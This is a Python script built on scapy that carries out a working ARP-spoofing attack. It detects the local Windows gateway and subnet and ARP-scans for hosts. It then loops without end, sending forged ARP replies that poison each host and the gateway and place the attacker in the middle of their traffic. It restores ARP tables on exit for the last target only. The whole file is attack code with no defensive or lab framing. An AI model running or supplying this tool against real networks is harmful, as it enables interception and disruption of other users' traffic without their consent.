import scapy.all as scapy
import subprocess
import ipaddress
import socket
import time
import sys
import re


def get_default_gateway():

    try:
        out = subprocess.check_output(["route", "print"], text=True, errors="ignore")
        m = re.search(r'^\s*0\.0\.0\.0\s+0\.0\.0\.0\s+(\d+\.\d+\.\d+\.\d+)\s+', out, re.MULTILINE)
        if m:
            return m.group(1)
    except Exception:
        pass

    try:
        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")

        matches = re.findall(r'Default Gateway[ .:]*([\d\.]+)', out)
        for g in matches:
            if g and not g.startswith('0.0.0.0'):
                return g
    except Exception:
        pass
    return None

ip_gateway = get_default_gateway()

def Ascan(ip_range):
    arp_request = scapy.ARP(pdst=ip_range)

    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc}
        if client_dict["ip"] != ip_gateway:
            clients_list.append(client_dict)
    
    return clients_list


def Lget_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return None
    finally:
        s.close()


def Mget_netmask_for_ip(local_ip):
    if not local_ip:
        return None
    try:
        out = subprocess.check_output(["ipconfig"], text=True, errors="ignore")
        blocks = re.split(r'\r?\n\r?\n', out)
        for block in blocks:
            if local_ip in block:
                m = re.search(r'Subnet Mask[ .:]*([\d\.]+)', block)
                if m:
                    return m.group(1)
    except Exception:
        pass
    return None


def Oget_mac(ip):
	mac = scapy.getmacbyip(ip)
	if mac is None:
		print(f"[!] Could not resolve MAC for {ip}. Host may be down or unreachable.")
	return mac


def Gspoof(target_ip, spoof_ip):
	target_mac = Oget_mac(target_ip)
	if not target_mac:
		return
	arp = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
	ether = scapy.Ether(dst=target_mac)
	packet = ether/arp
	scapy.sendp(packet, verbose=False)


def restore(destination_ip, source_ip):
	destination_mac = Oget_mac(destination_ip)
	source_mac = Oget_mac(source_ip)
	if not destination_mac or not source_mac:
		print(f"[!] Cannot restore ARP for {destination_ip} <- {source_ip} due to missing MAC.")
		return
	arp = scapy.ARP(op=2, pdst=destination_ip, psrc=source_ip, hwdst=destination_mac, hwsrc=source_mac)
	ether = scapy.Ether(dst=destination_mac)
	packet = ether/arp
	scapy.sendp(packet, count=5, verbose=False)
     

interval = 4
ip_gateway = get_default_gateway()
local_ip = Lget_local_ip()
netmask = Mget_netmask_for_ip(local_ip)

if local_ip and netmask:
    try:
        network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
        ip_range = f"{network.network_address}/{network.prefixlen}"
    except Exception:
        ip_range = None
else:
    if ip_gateway:
        parts = ip_gateway.split('.')
        ip_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    elif local_ip:
        parts = local_ip.split('.')
        ip_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
    else:
        ip_range = None
        
clients = Ascan(ip_range)

try:
    while True:
        for target_ip in clients:
            target_ip = target_ip['ip']
            print(f"Starting ARP spoofing: {target_ip} <-> {ip_gateway} (interval={interval}s)")
            Gspoof(target_ip, ip_gateway)
            Gspoof(ip_gateway, target_ip)
            time.sleep(interval)

except KeyboardInterrupt:
	print('\nInterrupted by user. Restoring ARP tables...')
	restore(ip_gateway, target_ip)
	restore(target_ip, ip_gateway)
	print('Restore completed. Exiting.')
	sys.exit(0)

except Exception as e:
	print(f"Runtime error: {e}")
	print('Attempting to restore ARP tables...')
	restore(ip_gateway, target_ip)
	restore(target_ip, ip_gateway)
	sys.exit(1)